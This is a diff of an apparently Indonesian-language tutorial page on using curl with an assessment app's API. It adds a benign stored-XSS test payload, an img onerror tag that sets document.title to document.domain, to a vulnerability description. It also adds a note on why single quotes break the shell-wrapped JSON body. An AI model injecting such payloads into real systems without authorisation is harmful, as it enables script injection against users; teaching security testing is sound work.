@@ -276,7 +276,13 @@ curl -s -b cookies.txt -G "http://72.62.120.97:8080/api/v1/targets/search" \
 curl -s -b cookies.txt -X POST \
   "http://72.62.120.97:8080/api/v1/assessments/&lt;ID&gt;/vulnerabilities" \
   -H 'content-type: application/json' \
-  -d '{"title":"XSS test","category":"XSS","severity":"MEDIUM","description":"&lt;img src=x onerror=\"document.title=&#39;xss-by-me&#39;\"&gt;"}'</code></pre>
+  -d '{"title":"XSS test","category":"XSS","severity":"MEDIUM","description":"&lt;img src=x onerror=document.title=document.domain&gt;"}'</code></pre>
+    <div class="warn-box"><b>Hindari jebakan tanda kutip.</b> Jangan memakai tanda kutip tunggal
+      <code>'...'</code> di dalam payload, karena seluruh body sudah dibungkus <code>-d '...'</code> (kutip tunggal).
+      Satu kutip tunggal di dalamnya akan <i>memutus</i> string shell → muncul
+      <code>"Body is not valid JSON"</code>. Payload <code>onerror=document.title=document.domain</code> tidak memakai
+      kutip sama sekali, jadi aman. Bila butuh teks ber-kutip, simpan body ke berkas lalu kirim dengan
+      <code>-d @body.json</code>.</div>
     <div class="exp"><b>Penjelasan:</b>
       <ul style="margin:1mm 0 0">
         <li>URL: <code>/assessments/&lt;ID&gt;/vulnerabilities</code> — menambah finding ke assessment ber-id <code>&lt;ID&gt;</code>.</li>
